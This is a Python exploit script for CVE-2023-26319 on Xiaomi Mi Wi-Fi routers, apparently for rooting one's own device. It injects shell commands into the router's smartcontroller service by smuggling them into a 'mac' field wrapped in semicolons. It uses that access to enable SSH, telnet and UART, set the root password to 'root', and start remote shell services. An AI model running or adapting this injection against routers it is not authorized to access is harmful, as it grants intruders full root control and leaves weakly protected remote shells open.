#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import datetime
import types
import platform
import ctypes
import binascii
import re
import requests
import urllib
import json

sys.path.append(os.path.dirname(os.path.abspath(__file__)))
from gateway import *

class ExploitError(Exception): pass


gw = Gateway(timeout = 4, detect_ssh = False)
if gw.status < 1:
    die("Xiaomi Mi Wi-Fi device not found (IP: {})".format(gw.ip_addr))

print("device_name =", gw.device_name)
print("rom_version = {} {}".format(gw.rom_version, gw.rom_channel))
print("mac address = {}".format(gw.mac_address))

dn = gw.device_name
gw.ssh_port = 22
ret = gw.detect_ssh(verbose = 1, interactive = True)
if ret > 0:
    die(0, "SSH server already installed and running")

ccode = gw.device_info["countrycode"]
if ccode == "CN":
    print('CountryCode = CN')

stok = gw.web_login()

# CVE-2023-26319   Note: https://blog.thalium.re/posts/rooting-xiaomi-wifi-routers/

# cat /etc/smartcontroller/SmartTask.sc | hexdump -C
# rm /etc/smartcontroller/SmartTask.sc
# service smartcontroller restart
# echo "OK" > /tmp/ntp.status
"""
// the `mac` parameter is user controlled
int32_t run_sysapi_macfilter(char* mac, int32_t wan_block)
{
    char cmdbuf[100];
    memset(&cmd_buffer, 0, 100);
    char* const wan = (wan_block) ? "no" : "yes";
    sprintf(&cmdbuf,
            "/usr/sbin/sysapi macfilter set mac=%s wan=%s;/usr/sbin/sysapi macfilter commit",
            mac,
            wan);
    // `mac` is directly injected into `system()`!
    return run_cmd(&cmdbuf);
}
"""
vuln_cmd = "/usr/sbin/sysapi macfilter set mac=;; wan=no;/usr/sbin/sysapi macfilter commit"
max_cmd_len = 100 - 1 - len(vuln_cmd)

def exec_smart_cmd(cmd, timeout = 7):
    api = 'xqsmarthome/request_smartcontroller'
    sc_command = cmd['command']
    payload = json.dumps(cmd, separators = (',', ':'))
    try:
        res = requests.post(gw.apiurl + api, data = { "payload": payload }, timeout = timeout)
    except Exception as e:
        msg = getattr(e, 'message', str(e))
        raise ExploitError(f'Cannot send POST-request "{sc_command}" to SmartController service. {msg}')
    return res.text

def reset_smart_task():
    res = exec_smart_cmd( { "command": "reset_scenes" } )
    try:
        dres = json.loads(res)
        code = dres['code']
    except Exception:
        raise ExploitError(f'Error on parse response for command "reset_scenes" => {res}')
    if code != 0:
        raise ExploitError(f'Error on exec command "reset_scenes" => {res}')
    return res

x_hour = 0
x_min = 0

def exec_tiny_cmd(cmd, act_delay = 0):
    global x_hour, x_min
    if len(cmd) > max_cmd_len:
        raise ExploitError(f'Payload string line is too long (len = {len(cmd)}, max_len = {max_cmd_len})')
    x_min += 1
    if x_min == 60:
        x_min = 0
        x_hour += 1
        if x_hour == 24:
            x_hour = 0
    # scene_setting + action_list + launch
    pdata = {  
                "command": "scene_setting",
                "name": f"it3_{x_hour}_{x_min}",
                "action_list": [ {
                    "thirdParty": "xmrouter",
                    "delay": 17,
                    "type": "wan_block",
                    "payload": {
                        "command": "wan_block",
                        "mac": ";" + cmd + ";"
                    }
                } ],
                "launch": {
                    "timer": {
                        "time": f"{x_hour}:{x_min}",
                        "repeat": "0",
                        "enabled": True
                    }
                }
            }
    res = exec_smart_cmd(pdata)
    try:
        dres = json.loads(res)
        code = dres['code']
    except Exception:
        raise ExploitError(f'Error on parse response for command "scene_setting" => {res}')
    if code != 0:
        raise ExploitError(f'Error on exec command "scene_setting" => {res}')
    scene_id = dres['id']
    #print("scene_id:", scene_id)
    # scene_start_by_crontab
    pdata = {
                "command": "scene_start_by_crontab",
                "time": f"{x_hour}:{x_min}",
                "week": 0
            }
    res = exec_smart_cmd(pdata, timeout = 10)
    try:
        dres = json.loads(res)
        code = dres['code']
    except Exception:
        if res.find('504 Gateway Time-out') > 0 and act_delay > 0:
            time.sleep(act_delay)
            code = 0
        else:
            raise ExploitError(f'Error on parse response for command "scene_start_by_crontab" => {res}')
    if code != 0:
        raise ExploitError(f'Error on exec command "scene_start_by_crontab" => {res}')
    # scene_delete
    pdata = { "command": "scene_delete", "id": scene_id }
    res = exec_smart_cmd(pdata)
    try:
        dres = json.loads(res)
        code = dres['code']
    except Exception:
        raise ExploitError(f'Error on parse response for command "scene_delete" => {res}')
    if code != 0:
        raise ExploitError(f'Error on exec command "scene_delete" => {res}')
    return res

def exec_cmd(command):
    fn = '/tmp/e'
    fcmd = 'echo -n "{txt}"{amode}{fn}'
    flen = len(fcmd.format(txt="", amode="", fn=fn))
    pos = 0
    while True:
        amode = ">" if pos == 0 else ">>"
        txtlen = max_cmd_len - flen - len(amode)
        txt = command[pos:pos+txtlen]
        pos += len(txt)
        if len(txt) == 0:
            break # End of Command
        if txt.find("'") >= 0 and txt.find('"') >= 0:
            raise ExploitError(f'Incorrect shell command (1)')
        fmt_cmd = fcmd
        if txt.find('"') >= 0:
            fmt_cmd = fcmd.replace('"', "'")
        cmd = fmt_cmd.format(txt=txt, amode=amode, fn=fn)
        #print(f"[{cmd}]")
        exec_tiny_cmd(cmd, act_delay = 2)
        pass
    exec_tiny_cmd(f"chmod +x {fn}", act_delay = 2)
    exec_tiny_cmd(f"sh {fn}", act_delay = 5)

def get_dev_systime():
    # http://192.168.31.1/cgi-bin/luci/;stok=14b996378966455753104d187c1150b4/api/misystem/sys_time
    # response: {"time":{"min":32,"day":4,"index":0,"month":10,"year":2023,"sec":7,"hour":6,"timezone":"XXX"},"code":0}
    res = requests.get(gw.apiurl + 'misystem/sys_time')
    try:
        dres = json.loads(res.text)
        code = dres['code']
    except Exception:
        raise ExploitError(f'Error on parse response for command "sys_time" => {res.text}')
    if code != 0:
        raise ExploitError(f'Error on get sys_time => {res.text}')
    return dres['time']

def set_dev_systime(dst, year = 0, month = 0, day = 0, hour = 0, min = 0, sec = 0, timezone = ""):
    if dst:
        year     = dst['year']
        month    = dst['month']
        day      = dst['day']
        hour     = dst['hour']
        min      = dst['min']
        sec      = dst['sec']
        timezone = dst['timezone']
    params = {
                'time': f"{year}-{month}-{day} {hour}:{min}:{sec}",
                'timezone': timezone
             }
    res = requests.get(gw.apiurl + 'misystem/set_sys_time', params = params)
    try:
        dres = json.loads(res.text)
        code = dres['code']
    except Exception:
        raise ExploitError(f'Error on parse response for command "set_sys_time" => {res.text}')
    if code != 0:
        raise ExploitError(f'Error on exec command "set_sys_time" => {res}')
    return res.text

# get device orig system time
dst = get_dev_systime()

print('Disable alarm mode for smartcontroller service ...')
# echo "OK" > /tmp/ntp.status
res = set_dev_systime(dst)

#print('Change date ...')
#time.sleep(20)
#res = exec_tiny_cmd("date -s 203301020304")
#die('----- TEST FINISHED ------')

print('Wait smartcontroller activation ...')
sc_activated = False
start_time = datetime.datetime.now() 
while datetime.datetime.now() - start_time <= datetime.timedelta(seconds = 32):
    time.sleep(2)
    try:
        res = exec_tiny_cmd("date -s 203301020304", act_delay = 2)
        #print(res)
    except Exception:
        try:
            set_dev_systime(dst)
            reset_smart_task()
        except Exception:
            pass
        print('============ smartcontroller failed ============')
        raise
    dxt = get_dev_systime()
    if dxt['year'] == 2033 and dxt['month'] == 1 and dxt['day'] == 2:
        if dxt['hour'] == 3 and dxt['min'] == 4:
            sc_activated = True
            break

# restore orig system time
time.sleep(1)
set_dev_systime(dst)
if not sc_activated:
    reset_smart_task()
    die('Exploit not working!!!')

#print('Logger ...')
#res = exec_cmd("logger hello")
# $ tail -n 50 /tmp/messages
#die('----- TEST FINISHED ------')

print('Unlock dropbear service ...')
res = exec_cmd("sed -i 's/release/XXXXXX/g' /etc/init.d/dropbear")
print('Unlock SSH and TelNet servers ...')
res = exec_cmd("nvram set ssh_en=1; nvram set telnet_en=1; nvram set uart_en=1; nvram set boot_wait=on; nvram set bootdelay=3; nvram commit")
print('Set password for "root" user (password: "root") ...')
res = exec_cmd(r"echo -e 'root\nroot' | passwd root")
print('Enable dropbear service ...')
res = exec_cmd("/etc/init.d/dropbear enable")
print('Run SSH server on port 22 ...')
res = exec_cmd("/etc/init.d/dropbear restart")

print('Test SSH connection to port 22 ...')
print("")
time.sleep(0.5)
gw.use_ssh = True
gw.passw = 'root'
ssh_en = gw.ping(verbose = 0, contimeout = 25)   # RSA host key generate slowly!
if ssh_en:
    print('#### SSH server are activated! ####')
else:
    print(f"WARNING: SSH server not responding (IP: {gw.ip_addr})")

if not ssh_en:
    print("")
    print('Run TelNet server on port 23 ...')
    res = exec_cmd("/etc/init.d/telnet restart")
    time.sleep(3)
    gw.use_ssh = False
    telnet_en = gw.ping(verbose = 2)
    print("")
    print('#### TelNet server are activated! ####')

